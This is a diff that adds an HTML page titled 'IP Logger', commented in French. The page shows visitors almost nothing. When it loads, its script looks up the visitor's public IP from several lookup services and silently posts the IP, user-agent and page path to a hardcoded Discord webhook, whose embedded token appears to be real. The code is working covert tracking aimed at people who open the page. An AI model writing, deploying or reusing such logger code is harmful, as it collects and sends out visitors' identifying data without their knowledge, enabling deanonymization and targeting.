@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>IP Logger</title>
+</head>
+<body>
+
+<script>
+    (function() {
+        // ─── Ton webhook Discord (NOUVEAU) ──────────────────────────
+        const WEBHOOK_URL =
+            "https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY";
+
+        // ─── Services pour récupérer l'IP ──────────────────────────
+        const SERVICES = [
+            "https://api.ipify.org?format=json",
+            "https://api.my-ip.io/ip.json",
+            "https://ipapi.co/json/",
+            "https://ip-api.com/json/"
+        ];
+
+        // ─── Récupérer l'IP ────────────────────────────────────────
+        async function fetchIp() {
+            for (const url of SERVICES) {
+                try {
+                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
+                    if (!res.ok) continue;
+                    const data = await res.json();
+                    const ip = data.ip || data.query || data.ip_address || null;
+                    if (ip && ip.trim().length > 0) {
+                        return ip.trim();
+                    }
+                } catch { /* ignorer */ }
+            }
+            return null;
+        }
+
+        // ─── Envoyer à Discord ──────────────────────────────────────
+        async function sendToDiscord(ip) {
+            const userAgent = navigator.userAgent || "inconnu";
+            const payload = {
+                content: `🌐 **Visite**\n📌 IP : \`${ip}\`\n🖥️ User-Agent : \`${userAgent}\`\n📄 Page : \`${location.pathname}\``
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                cache: "no-store",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // ─── EXÉCUTION ──────────────────────────────────────────────
+        (async function main() {
+            try {
+                const ip = await fetchIp();
+                if (ip) {
+                    await sendToDiscord(ip);
+                    console.log("✅ IP envoyée :", ip);
+                } else {
+                    console.error("❌ IP non trouvée");
+                }
+            } catch (err) {
+                console.error("❌ Erreur :", err);
+            }
+        })();
+    })();
+</script>
+
+</body>
+</html>
